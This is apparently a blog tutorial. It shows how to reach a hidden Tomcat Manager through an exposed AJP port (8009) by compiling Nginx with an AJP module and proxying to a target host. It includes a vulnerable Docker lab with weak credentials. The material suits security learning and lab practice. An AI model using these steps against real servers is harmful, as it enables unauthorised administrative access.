---
title: "Nginx Reverse Proxy & AJP"
description: "AJP is a wire protocol, used by Apache Server to connect to TomCat."
date: "2023-10-07"
headerImage: "https://cdn.educba.com/academy/wp-content/uploads/2021/04/Nginx-vs-Tomcat.jpg"
tags: []
---

![](https://cdn.educba.com/academy/wp-content/uploads/2021/04/Nginx-vs-Tomcat.jpg)

# Introduction to AJP
- AJP is a wire protocol, used by Apache Server to connect to TomCat.
- When seeing a AJP proxy ports (8009 TCP), we may be able to get access to hidden Tomcat Manager.
- We can configure Apache server to interact with AJP to get access to the underlying applications, gaining administrative rights.

# Create the vulnerability
1. Create `tomcat-users.xml`

```bash
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```
2. Install docker
```bash
sudo apt install docker.io
sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
```

# Nginx Reverse Proxy & AJP
- To get access to the hidden Tomcat Manager, we can use Nginx with `ajp_module` and follow the steps below:
	1. Download the Nginx source code
	2. Download the required module
	3. Compile Nginx source code with the `ajp_module`
	4. Create a configuration file pointing to the AJP port

1. Download the Nginx source code
```bash
wget https://nginx.org/download/nginx-1.21.3.tar.gz
tar -xzvf nginx-1.21.3.tar.gz
```

2. Download the `ajp_module`
```bash
git clone https://github.com/dvershinin/nginx_ajp_module.git
```

3. Compile Nginx source code with the `ajp_module`
```bash
cd nginx-1.21.3
sudo apt install libpcre3-dev
./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
make
sudo make install
nginx -V
```

4. Pointing to the AJP Port
- Comment out the entire `server` block and append the following lines inside the `http` block in `/etc/nginx/conf/nginx.conf`.
```bash
upstream tomcats {
	server $TARGET_SERVER:8009;
	keepalive 10;
	}
server {
	listen $LOCAL_PORT;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```

## Double check everything
```bash
sudo nginx
curl http://127.0.0.1:$LOCAL_PORT
```  
